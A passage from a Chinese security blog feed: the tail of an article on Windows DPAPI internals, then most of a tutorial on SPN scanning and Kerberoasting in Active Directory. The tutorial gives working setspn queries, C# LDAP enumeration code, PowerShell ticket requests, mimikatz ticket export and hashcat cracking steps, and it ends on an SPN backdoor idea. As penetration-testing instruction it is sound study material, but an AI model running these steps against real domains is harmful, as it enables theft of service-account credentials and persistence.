style="text-align:center">SHA-1</td><td style="text-align:center">DES-3</td></tr><tr><td style="text-align:center">Windows Vista</td><td style="text-align:center">24000</td><td style="text-align:center">SHA-1</td><td style="text-align:center">DES-3</td></tr><tr><td style="text-align:center">Windows 7</td><td style="text-align:center">5600</td><td style="text-align:center">SHA-512</td><td style="text-align:center">SHA-256</td></tr><tr><td style="text-align:center">Windows 8</td><td style="text-align:center">8000</td><td style="text-align:center">SHA-512</td><td style="text-align:center">SHA-256</td></tr><tr><td style="text-align:center">Windows 10</td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><p>​        由 DPAPI 的加密过程分析可知，要使 DPAPI 正常运作，必须保存用户所有的历史登陆密码的 SHA-1 值。用户所有的历史登陆密码的 SHA-1 值存储在一个名为 CREDHIST 的历史凭据文件中，结构如图所示</p><p><img src="/image/【知识回顾】DPAPI 详解/历史凭据文件结构.png" alt=""></p><p><center>图5 历史凭据文件结构</center><br>​        CREDHIST 以链表的形式存储用户历史登陆密码的 SHA-1 值，每个用户的登陆密码散列值作为链表的一个节点，整个链表在文件中以反向形式存储，即表头在最后，倒数第二个记录时第一个节点，依次类推。而每个链表节点都具有相同的数据格式，并且每个节点的 SHA-1 值被前一个节点的 SHA-1 值加密处理，加密的方式与主密钥的加密方式一样。</p><p>​        图 2 的解密主密钥过程中涉及一个基于口令的密钥派生函数（ PBKDF2 ）的调用，微软的 PBKDF2 跟工业标准（ PKCD#5 ）不太一样，其内部做了部分改动。工业标准的 PBKDF2 函数循环内的伪随机函数的输入时上一次循环伪随机函数的输出，而微软 PBKDF2 函数伪随机函数的输入则是上两次相邻随机函数输出的异或。</p><h3 id="3-3-解密-DPAPI-加密块"><a href="#3-3-解密-DPAPI-加密块" class="headerlink" title="3.3 解密 DPAPI 加密块"></a>3.3 解密 DPAPI 加密块</h3><p>​        从图 2 的 DPAPI 离线解密过程可以知道，在解密 DPAPI加密块时先需要从主密钥派生一个会话密钥，派生过程中调用了改版的加密散列函数（ M_HMAC() ）和一个烟花密钥函数（ DeriveKey() ）。<code>M_HMAC()</code> 输入包括 DPAPI 提供的额外熵参数。</p><ul><li><p><code>M_HMAC()</code> 具体描述如下所示：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">M_HMAC</span><span class="params">(K, m, e, s)</span></span> 算法的数据定义为：</span><br><span class="line"><span class="function"><span class="title">M_HMAC</span><span class="params">(K, m, e, s)</span></span> = H((K ⊕ opad) <span class="comment">// H((K ⊕ ipad) // m) // e // s)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">H</span><span class="params">()</span></span> 表示对应的散列函数</span><br><span class="line">K 表示密钥，这里对应密钥的 SHA-<span class="number">1</span> 值</span><br><span class="line">M 表示需要认证的数据，这里对应 Salt</span><br><span class="line">S 表示强密码</span><br><span class="line"><span class="comment">// 表示两个字符串的连接</span></span><br><span class="line">⊕ 表示异或</span><br><span class="line">Opad 表示外部填充块</span><br><span class="line">Ipad 表示内部填充块</span><br></pre></td></tr></table></figure></li><li><p><code>DeriveKey()</code> 对应于 CryptoAPI 的 CryptDeriveKey()，具体描述如下：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">DeriveKey</span><span class="params">(d, n)</span></span> 算法的数据定义为：</span><br><span class="line"><span class="function"><span class="title">DeriveKey</span><span class="params">(d, n)</span></span> = F-n(H( d ⊕ ipad) <span class="comment">// H(d ⊕ opad))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">H</span><span class="params">()</span></span> 表示对应的散列函数</span><br><span class="line"><span class="function"><span class="title">F-n</span><span class="params">()</span></span> 表示取前 t 个字节数据</span><br><span class="line">n 表示需要演化出的密钥长度</span><br><span class="line">d 表示被演化的数据(对应 M_HMAC() 输出)，并通过填充 <span class="number">0</span> 补齐 <span class="number">64</span> 字节长</span><br><span class="line"><span class="comment">// 表示两个字符串的连接</span></span><br><span class="line">⊕ 表示异或</span><br><span class="line">Opad 表示外部填充块</span><br><span class="line">Ipad 表示内部填充块</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x04-DPAPI-的应用"><a href="#0x04-DPAPI-的应用" class="headerlink" title="0x04 DPAPI 的应用"></a>0x04 DPAPI 的应用</h2><ul><li>EFS文件加密</li><li>存储无线连接密码</li><li>Windows凭据管理器</li><li>IE浏览器</li><li>外表</li><li>Skype的</li><li>Windows CardSpace</li><li>Windows Vault</li><li>谷歌浏览器</li></ul><h2 id="0x05-结束语"><a href="#0x05-结束语" class="headerlink" title="0x05 结束语"></a>0x05 结束语</h2><p>在 WIndows 操作系统中，DPAPI 作为具有加密功能的最主要接口之一，保护着大量的用户私密数据。然而，本文给出的 DPAPI 离线解密方法，只适用于单机用户，无法解密域管理员控制下的 DPAPI 加密的数据。与环境控制下的 DPAPI 加密机制相对于淡季用户有很大的不同。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://netinfo-security.org/CN/article/downloadArticleFile.do?attachType=PDF&amp;id=518" target="_blank" rel="noopener">DPAPI 离线解密方法及其取证应用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;摘要：&lt;/strong&gt;数据保护接口是微软从 Windows 2000 开始引入的一种简易程序接口，主要为应用程序和操作系统程序提供高强度的数据加密和解密服务。Windows 系统用户大量的私密数据都采用了 DPAPI 进行加密存储。&lt;/p&gt;
    
    </summary>
    
      <category term="系统安全" scheme="https://rcoil.me/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】SPN 扫描利用</title>
    <link href="https://rcoil.me/2019/06/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91SPN%20%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8/"/>
    <id>https://rcoil.me/2019/06/【域渗透】SPN 扫描利用/</id>
    <published>2019-06-10T10:52:59.000Z</published>
    <updated>2019-10-31T15:46:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>Kerberos</code> 与 <code>SPN</code>。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在内网渗透的信息收集中，机器服务探测一般都是通过端口扫描去做的，但是有些环境不允许这些操作。通过利用 SPN 扫描可快速定位开启了关键服务的机器，这样就不需要去扫对应服务的端口，有效规避端口扫描动作。</p><p><code>Kerberoasting</code> 是域渗透中经常使用的一项技术，是通过爆破 <code>TGS-REP</code> 实现。</p><h2 id="0x01-关于-SPN"><a href="#0x01-关于-SPN" class="headerlink" title="0x01 关于 SPN"></a>0x01 关于 <code>SPN</code></h2><p>服务主体名称（<code>SPN: Service Principal Names</code>）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。</p><p>如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 <code>SPN</code>。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 <code>SPN</code>。<code>SPN</code> 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机名称或别名注册 <code>SPN</code>。</p><p>如果用一句话来说明的话就是如果想使用 <code>Kerberos</code> 协议来认证服务，那么必须正确配置 <code>SPN</code>。</p><p>SPN 可以分为两种：</p><ul><li>注册在域内机器账户（<code>Computers</code>）上</li><li>注册在域内用户账户（<code>Users</code>）下</li></ul><h2 id="0x02-SPN-标准格式"><a href="#0x02-SPN-标准格式" class="headerlink" title="0x02 SPN 标准格式"></a>0x02 <code>SPN</code> 标准格式</h2><p>在 SPN 语法中存在 4 种元素，两个必须元素和两个格外元素。其中 <code>&lt;service class&gt;</code> 和 <code>&lt;host&gt;</code> 为必需元素。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;service <span class="class"><span class="keyword">class</span>&gt;/&lt;host&gt;:&lt;port&gt; &lt;servername&gt;</span></span><br><span class="line">服务类型/对应机器名<span class="symbol">:</span>服务端口[默认端口可不写]</span><br><span class="line">MSSQLSvc/SQLServer.rcoil.<span class="symbol">me:</span><span class="number">1433</span></span><br></pre></td></tr></table></figure><h2 id="0x03-使用-SetSPN-为机器-域用户-创建-SPN"><a href="#0x03-使用-SetSPN-为机器-域用户-创建-SPN" class="headerlink" title="0x03 使用 SetSPN 为机器(域用户)创建 SPN"></a>0x03 使用 <code>SetSPN</code> 为机器(域用户)创建 <code>SPN</code></h2><p>命令语法类似如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn -S http/<span class="tag">&lt;<span class="name">computername</span>&gt;</span>.<span class="tag">&lt;<span class="name">domainname</span>&gt;</span> <span class="tag">&lt;<span class="name">domain-user-account</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>-S</code> 参数：验证不存在重复项后，添加随意 <code>SPN</code>。<strong>注意：</strong> <code>-S</code> 从 <code>Windows Server 2008</code> 开始系统默认提供。</p><p>此处以 Web 服务器为例。</p><ul><li>以 <code>web 用户</code> 运行 <code>Web 服务器</code></li><li>域管理员权限运行 <code>cmd</code></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Setspn -s http/WebDemo_PC<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> rcoil\web</span><br><span class="line">Setspn -s http/WebDemo_PC<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> WebDemo_PC$</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-06_15-41-04.png" alt="Snipaste_2019-06-06_15-41-04"></p><h2 id="0x04-借助-SetSPN-对域内相关服务进行查询"><a href="#0x04-借助-SetSPN-对域内相关服务进行查询" class="headerlink" title="0x04 借助 SetSPN 对域内相关服务进行查询"></a>0x04 借助 <code>SetSPN</code> 对域内相关服务进行查询</h2><h3 id="4-1、查询域内-MSSQL-数据库服务器"><a href="#4-1、查询域内-MSSQL-数据库服务器" class="headerlink" title="4.1、查询域内 MSSQL 数据库服务器"></a>4.1、查询域内 <code>MSSQL</code> 数据库服务器</h3><p><em>使用第 3 点中的对照表快速查询</em></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T rcoil.me -Q */* <span class="string">| findstr "</span>MSSQLSvc<span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="4-2、相关查询-C-源码"><a href="#4-2、相关查询-C-源码" class="headerlink" title="4.2、相关查询 C# 源码"></a>4.2、相关查询 <code>C# 源码</code></h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.DirectoryServices;</span><br><span class="line"><span class="keyword">using</span> System.DirectoryServices.ActiveDirectory;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SPNSearcher</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Domain CurrentDomain = Domain.GetCurrentDomain();</span><br><span class="line">            DirectoryEntry rootEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"LDAP://rootDSE"</span>);</span><br><span class="line">            <span class="keyword">string</span> RootDSE = (<span class="keyword">string</span>)rootEntry.Properties[<span class="string">"defaultNamingContext"</span>].Value;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domain: "</span>+ CurrentDomain);</span><br><span class="line">            GetSPNInfor(RootDSE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 通过 SPN 扫描获取域中基于主机的 MSSQL、Exchange 等服务</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> ADSearcherSPNTypes = "ADAM","AGPM","bo","CESREMOTE","Dfs","DNS","Exchange","FIMService","ftp","http","IMAP","ipp","iSCSITarget","kadmin","ldap","MS","sql","nfs","secshd","sip","SMTP","SoftGrid","TERMSRV","Virtual","vmrc","vnc","vpn","vssrvc","WSMAN","xmpp"</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="RootDSE"&gt;</span>Current forest.<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetSPNInfor</span>(<span class="params"><span class="keyword">string</span> RootDSE</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domian SPN Information:"</span>);</span><br><span class="line"></span><br><span class="line">            DirectoryEntry gcEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"GC://"</span> + RootDSE);</span><br><span class="line"></span><br><span class="line">            List&lt;<span class="keyword">string</span>&gt; Supersedence = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;();</span><br><span class="line">            Supersedence.AddRange(<span class="keyword">new</span> <span class="keyword">string</span>[]</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"SQL:*MSSQL*:SQL Server 数据库"</span>,</span><br><span class="line">                <span class="string">"Exchange:*exchange*:Exchange 相关服务"</span>,</span><br><span class="line">                <span class="string">"DNS:*DNS*:DNS 服务"</span>,</span><br><span class="line">                <span class="string">"SQL:*MySql*:MySql 数据库"</span>,</span><br><span class="line">                <span class="string">"Oracle:*Oracle*:Oracle 数据库"</span>,</span><br><span class="line">                <span class="string">"postgres:*postgres*:Postgres 数据库"</span>,</span><br><span class="line">                <span class="string">"HTTPS:*HTTPS*:HTTPS Web 服务"</span>,</span><br><span class="line">                <span class="string">"HTTP:*HTTP*:HTTP Web 服务"</span>,</span><br><span class="line">                <span class="string">"VPN:*VPN*:VPN 远程接入服务"</span>,</span><br><span class="line">                <span class="string">"VNC:*VNC*:VNC 服务"</span></span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">string</span> SPNServiceFilter <span class="keyword">in</span> Supersedence)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span>[] sArray = Regex.Split(SPNServiceFilter, <span class="string">":"</span>, RegexOptions.IgnoreCase);</span><br><span class="line">                <span class="keyword">string</span> ContainsInfo = sArray[<span class="number">0</span>].ToString();</span><br><span class="line">                <span class="keyword">string</span> ADSearcherSPNTypes = sArray[<span class="number">1</span>].ToString();</span><br><span class="line">                <span class="keyword">string</span> SPNService = sArray[<span class="number">2</span>].ToString();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (gcEntry)</span><br><span class="line">                &#123;</span><br><span class="line">                    DirectorySearcher spnSearch = <span class="keyword">new</span> DirectorySearcher(gcEntry, <span class="string">"(&amp;(objectClass=user)(servicePrincipalName="</span> + ADSearcherSPNTypes + <span class="string">"))"</span>);</span><br><span class="line"></span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">                    Console.WriteLine(<span class="string">"  [+] SPN service: "</span> + SPNService);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">foreach</span> (SearchResult sr <span class="keyword">in</span> spnSearch.FindAll())</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> SPNs = sr.Properties[<span class="string">"servicePrincipalName"</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (SPNs.Count &gt; <span class="number">1</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">foreach</span> (<span class="keyword">string</span> spn <span class="keyword">in</span> SPNs)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (spn.Contains(ContainsInfo))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    Console.WriteLine(<span class="string">"    [&gt;] SAM Account Name: &#123;0&#125;"</span>, sr.Properties[<span class="string">"sAMAccountName"</span>][<span class="number">0</span>]);</span><br><span class="line">                                    Console.WriteLine(<span class="string">"    [&gt;] "</span> + spn);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            Console.WriteLine(<span class="string">"    [&gt;] "</span> + SPNs[<span class="number">0</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自行添加需要的服务即可，更多的服务写在了备注中。</p><h3 id="4-3、相关原理说明"><a href="#4-3、相关原理说明" class="headerlink" title="4.3、相关原理说明"></a>4.3、相关原理说明</h3><p>在 SPN 扫描时我们可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容</p><p><code>LDAP 协议</code>全称是 <code>Lightweight Directory Access Protocol</code>，一般翻译都是翻译成 <strong>轻量目录访问协议</strong>。通俗点可以把 <code>LDAP 协议</code>理解为一个关系型数据库，其中存储了域内主机的各种配置信息。</p><p>在域控中默认安装有 <code>ADSI 编辑器</code>，它是 <code>LDAP</code> 的编辑器，可以通过在域控中运行 <code>adsiedit.msc</code> 来打开。</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_10-43-30.png" alt="Snipaste_2019-06-10_10-43-30"></p><p>我们的 <code>SPN 查询</code>，实际上就是就是查询 <code>LDAP</code> 中存储的内容。（以后会通过别的章节详细介绍 <code>LDAP 协议</code>）</p><p>下图是 <code>4.2</code> 中 <code>MSSQL 查询</code>的结果，协议为 <code>LDAP</code>。</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_10-19-38.png" alt="Snipaste_2019-06-10_10-19-38"></p><h3 id="4-4、更多扫描工具"><a href="#4-4、更多扫描工具" class="headerlink" title="4.4、更多扫描工具"></a>4.4、更多扫描工具</h3><p>扫描工具有很多，但是只要知道原理就不会觉得太难。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Discover-PAMSSQLServers</span><span class="params">(Powershell-AD-Recon)</span></span></span><br><span class="line"><span class="function"><span class="title">GetUserSPNs</span><span class="params">(Powershell、vbs、Python)</span></span></span><br><span class="line"><span class="function"><span class="title">PowerView</span><span class="params">(Powershell)</span></span></span><br><span class="line"><span class="function"><span class="title">SetSPN</span><span class="params">(exe)</span></span></span><br></pre></td></tr></table></figure><h2 id="0x05-获取当前目标域中所有以域用户身份起服务的-SPN"><a href="#0x05-获取当前目标域中所有以域用户身份起服务的-SPN" class="headerlink" title="0x05 获取当前目标域中所有以域用户身份起服务的 SPN"></a>0x05 获取当前目标域中所有以域用户身份起服务的 SPN</h2><p>查询以域用户身份起的服务，主要是为了后续 <code>Kerberoast</code>做准备。</p><ul><li>现成工具</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript<span class="selector-class">.exe</span> GetUserSPNs.vbs</span><br><span class="line">powerview --&gt; Get-NetUser -SPN</span><br></pre></td></tr></table></figure><ul><li><code>C# 代码</code>（其实就是查询LDAP）：</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetUserSPN</span>(<span class="params"><span class="keyword">string</span> RootDSE</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domian SPN Information:"</span>);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            DirectoryEntry gcEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"GC://"</span> + RootDSE);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">string</span> querySPN = <span class="string">@"(&amp;(!objectClass=computer)(servicePrincipalName=*))"</span>;</span><br><span class="line">            <span class="keyword">using</span> (gcEntry)</span><br><span class="line">            &#123;</span><br><span class="line">                DirectorySearcher mssqlSearch = <span class="keyword">new</span> DirectorySearcher(gcEntry, querySPN);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (SearchResult sr <span class="keyword">in</span> mssqlSearch.FindAll())</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] SamAccountName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"sAMAccountName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] DistinguishedName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"distinguishedName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] ServicePrincipalName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"servicePrincipalName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li><p>结果如下：</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_11-22-02.png" alt="Snipaste_2019-06-10_11-22-02"></p></li></ul><h2 id="0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><h3 id="6-1、申请-TGS"><a href="#6-1、申请-TGS" class="headerlink" title="6.1、申请 TGS"></a>6.1、申请 TGS</h3><ul><li><code>powershell</code></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt;<span class="built_in">Add-Type</span> -AssemblyName System.IdentityModel</span><br><span class="line">PS&gt;<span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">"HTTP/WebDemo_PC.rcoil.me"</span></span><br></pre></td></tr></table></figure><ul><li><code>C#</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public KerberosRequestorSecurityToken (string servicePrincipalName);</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">servicePrincipalName</span><br><span class="line">String</span><br><span class="line">KerberosRequestorSecurityToken 安全令牌的服务主体名称。 设置 ServicePrincipalName 属性。</span><br><span class="line">异常</span><br><span class="line">ArgumentNullException</span><br><span class="line">servicePrincipalName 为 null。</span><br><span class="line">SecurityTokenException</span><br><span class="line">无法为当前用户获取 Kerberos 票证。</span><br></pre></td></tr></table></figure><p>这一整个过程是通过 <code>AS-REQ、AS-REP、TGS-REQ、TGS-REP</code> 这四个认证流程，最终获取到 RC4方式的加密票据。</p><h3 id="6-2、获取-TGS-REP"><a href="#6-2、获取-TGS-REP" class="headerlink" title="6.2、获取 TGS-REP"></a>6.2、获取 TGS-REP</h3><p><code>Kerberos 协议</code>中请求的票据会保存在内存中，可以通过 <code>klist</code> 命令查看当前会话存储的 <code>kerberos</code> 票据。</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_15-17-14.png" alt="Snipaste_2019-06-10_15-17-14"></p><ul><li><p>使用 <code>mimikatz</code> 的 <code>kerberos::list /export</code> 导出。</p></li><li><p><code>SharpRost</code> （如今的Rubeus）</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_15-53-24.png" alt="Snipaste_2019-06-10_15-53-24"></p></li><li><p><code>Invoke-kerberoast</code> 的 <code>-outputformat</code> ，选择 hashcat 格式。</p></li><li><p>综合以上代码，新建项目，项目地址: <a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SPNSearcher" target="_blank" rel="noopener">SPNSearcher</a></p></li></ul><h3 id="6-3、爆破-TGS-REP"><a href="#6-3、爆破-TGS-REP" class="headerlink" title="6.3、爆破 TGS-REP"></a>6.3、爆破 TGS-REP</h3><p>此处爆破的是<code>HTTP/WebDemo_PC.rcoil.me</code></p><p>可选择工具（工具始终是工具，看的是字典强不强）:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py(kerberoast套装)</span><br><span class="line"><span class="function"><span class="title">hashcat</span><span class="params">(密码破解全能工具，kali自带)</span></span></span><br></pre></td></tr></table></figure></p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_15-35-24.png" alt="Snipaste_2019-06-10_15-35-24"></p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_15-46-01.png" alt="Snipaste_2019-06-10_15-46-01"></p><h2 id="0x07-Kerberoasting-的后门利用"><a href="#0x07-Kerberoasting-的后门利用" class="headerlink" title="0x07 Kerberoasting 的后门利用"></a>0x07 <code>Kerberoasting</code> 的后门利用</h2><p>在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 TGS 